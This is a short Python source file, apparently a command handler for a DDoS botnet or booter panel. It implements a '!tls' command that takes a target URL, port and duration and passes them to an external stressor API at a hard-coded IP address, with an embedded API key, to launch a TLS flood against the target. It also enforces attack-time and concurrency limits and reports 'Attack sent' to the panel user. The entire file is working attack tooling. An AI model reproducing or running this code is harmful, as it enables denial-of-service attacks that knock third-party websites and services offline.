import requests
from colorama import Fore
import time

last_tls_time = 0

def tls(args, validate_time, send, client, ansi_clear, broadcast, data):
    global last_tls_time
    if len(args) == 4:
        url = args[1]
        port = args[2]
        time_str = args[3]
        try:
            time_int = int(time_str)
            if time_int > 60:
                send(client, "Your max time is 60 seconds")
                return
            if time.time() - last_tls_time < 60:
                send(client, "Your max concurrent is 1")
                return

            res1 = requests.get(f'http://162.19.145.38/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLS')
            if validate_time(str(time_int)):
                last_tls_time = time.time()
                send(client, f"{Fore.WHITE}Attack sent to {Fore.RED}0 {Fore.WHITE}bots - ID: Allah")
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
        except Exception as e:
            send(client, f'Error: {str(e)}')
    else:
        send(client, f'{Fore.WHITE}Usage: !tls [URL] [PORT] [TIME]')























